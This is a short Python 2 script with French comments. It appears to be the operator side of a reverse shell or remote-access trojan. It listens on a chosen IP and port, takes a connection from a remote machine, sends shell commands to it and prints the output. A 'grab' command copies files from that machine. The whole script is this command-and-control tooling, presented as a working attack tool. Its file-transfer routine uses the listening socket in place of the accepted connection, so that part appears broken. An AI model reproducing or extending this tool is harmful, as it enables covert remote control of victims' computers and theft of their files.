# coding: utf-8
import socket
import os


def transfer(socketConnexion, command):
    socketConnexion.send(command)
    f = open('/home/khalil/Bureau/test.png', 'wb')
    while True:
        bits = socketConnexion.recv(1024)
        if 'Unable to find out the file' in bits:
            print ('[-] Unable to find out the file')
            break
        if bits.endswith('DONE'):
            print ('[+] Transfer completed ')
            f.close()
            break
        f.write(bits)



def connect(adresseIP, port):
    socketConnexion=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketConnexion.bind((adresseIP, port))
    socketConnexion.listen(1)
    conn, addr = socketConnexion.accept() # cette ligne retourne l'adresse du client et la connexion
    print ('[+] On la connexion de la machine ', addr)

    while True:

        command = raw_input("Shell> ") # cette commande est comme scanf en c mais la valeur est une chaine de caractère


        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        elif 'grab' in command:

                transfer(socketConnexion, command)
        else:
            conn.send(command)
            print (conn.recv(1024))

def main ():

    i=0
    textIP=os.popen("ifconfig | grep inet | awk -F' ' '{print $2}'").readlines()
    i=0
    for element in textIP:
        b=str(i)
        print(b +'  --->   '+ textIP[i])
        i=i+1
    print("Veillez saisir l'indice de votre adresse ip")
    choixAdresse = input(" ")

    adresseIP = textIP[choixAdresse]
    print(adresseIP)
    print("Veillez saisir un numéro de port")
    port = input(" ")






    connect(adresseIP, port)
main()